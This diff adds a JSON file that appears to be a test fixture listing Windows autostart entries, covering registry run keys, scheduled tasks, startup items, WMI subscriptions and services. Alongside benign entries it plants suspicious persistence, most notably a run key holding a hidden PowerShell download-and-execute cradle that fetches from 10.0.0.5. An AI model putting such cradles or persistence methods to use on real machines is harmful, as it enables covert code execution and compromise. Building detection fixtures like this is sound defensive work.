@@ -1,0 +1,55 @@
+{
+  "run_keys": [
+    {
+      "hive": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "name": "SecurityHealth",
+      "command": "%windir%\\system32\\SecurityHealthSystray.exe"
+    },
+    {
+      "hive": "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "name": "OneDrive",
+      "command": "\"C:\\Users\\alice\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background"
+    },
+    {
+      "hive": "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "name": "Updater",
+      "command": "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/a')"
+    }
+  ],
+  "scheduled_tasks": [
+    {
+      "name": "GoogleUpdateTaskMachineCore",
+      "path": "\\",
+      "action": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /c",
+      "author": "Google LLC",
+      "state": "Ready"
+    },
+    {
+      "name": "SysHealth",
+      "path": "\\Microsoft\\Windows\\Maintenance\\",
+      "action": "cmd.exe /c C:\\Users\\Public\\sh.bat",
+      "author": "DESKTOP-7A1\\svcweb",
+      "state": "Ready"
+    }
+  ],
+  "startup_folder": [
+    {
+      "path": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notes.lnk",
+      "name": "notes.lnk"
+    }
+  ],
+  "wmi_subscriptions": [
+    {
+      "name": "\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\"Updater\"",
+      "consumer_type": "binding",
+      "command": "\\\\.\\root\\subscription:__EventFilter.Name=\"FilterUpdater\""
+    }
+  ],
+  "auto_services": [
+    {
+      "name": "VulnSvc",
+      "path": "C:\\Program Files\\Acme Updater\\bin\\updater.exe --run",
+      "start_mode": "Auto"
+    }
+  ]
+}
